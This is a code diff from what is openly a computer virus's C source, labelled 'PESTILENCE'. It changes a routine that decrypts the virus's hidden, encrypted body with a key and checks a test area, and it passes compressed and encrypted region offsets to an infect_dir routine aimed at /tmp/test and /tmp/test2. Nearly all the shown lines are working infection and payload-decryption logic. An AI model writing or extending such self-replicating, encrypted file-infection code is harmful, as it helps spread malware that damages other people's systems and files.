@@ -49,13 +49,17 @@ void change_garbage_code(){
 //======================= PESTILENCE =========================
 
 int __start decryptHiddenCode(){
+	uint32_t *k = (uint32_t *)key;
+	//-- decrypt z2        ------
+	//decrypt(&cmpr_start, ((size_t)&cmpr_end) - ((size_t)&cmpr_start), k, FALSE);
+
+	//-- decrypt z3        ------
 	char *s = ((char*)&crypt_start);
 	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
-	
-	decrypt(s,n,(uint32_t*)key, iscompressed);
-	//decrypt test area
+	decrypt(s,n,k, iscompressed);
 
-	decrypt(&test_area,15,(uint32_t*)key, FALSE);
+	//-- decrypt test area ------
+	decrypt(&test_area,15,k, FALSE);
 	//check test area
 	for (int i = 0; i < 15; i++)
 		if ((&test_area)[i] != 'A')
@@ -68,11 +72,14 @@ int __start decryptHiddenCode(){
 void do_infection(){
         char *virus = (char *)&bin_start;
         size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);
+        size_t cmpr_off = ((size_t)&cmpr_start) - ((size_t)&bin_start);
+        size_t cmpr_len = ((size_t)&cmpr_end) - ((size_t)&cmpr_start);
+
         size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
         size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 
-	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	infect_dir("/tmp/test", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len}, opt);
+	infect_dir("/tmp/test2", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len}, opt);
 }
 
 int virus(int ac, char **av){
